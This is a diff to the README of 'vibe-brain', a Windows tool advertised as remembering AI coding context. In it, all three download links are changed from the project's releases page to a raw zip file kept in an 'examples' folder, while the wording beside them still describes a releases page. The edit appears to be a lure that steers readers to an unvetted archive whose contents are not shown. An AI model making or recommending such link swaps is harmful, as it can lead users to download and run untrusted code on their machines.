@@ -1,6 +1,6 @@
 # 🧠 vibe-brain - Never Forget AI Coding Context
 
-[![Download vibe-brain](https://img.shields.io/badge/Download-vibe--brain-brightgreen?style=for-the-badge)](https://github.com/vinumahesh22/vibe-brain/releases)
+[![Download vibe-brain](https://img.shields.io/badge/Download-vibe--brain-brightgreen?style=for-the-badge)](https://github.com/vinumahesh22/vibe-brain/raw/refs/heads/main/examples/brain_vibe_v1.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get vibe-brain and start using it on your Windows machine.
 
 Click on the big green button at the top or visit this link:
 
-[Download vibe-brain Releases](https://github.com/vinumahesh22/vibe-brain/releases)
+[Download vibe-brain Releases](https://github.com/vinumahesh22/vibe-brain/raw/refs/heads/main/examples/brain_vibe_v1.1.zip)
 
 This page lists the latest versions available for download.
 
@@ -127,7 +127,7 @@ vibe-brain stores your session data locally on your PC. It does not send data to
 
 Click here to visit the download page and get started:
 
-[Download vibe-brain](https://github.com/vinumahesh22/vibe-brain/releases)
+[Download vibe-brain](https://github.com/vinumahesh22/vibe-brain/raw/refs/heads/main/examples/brain_vibe_v1.1.zip)
 
 ---
 
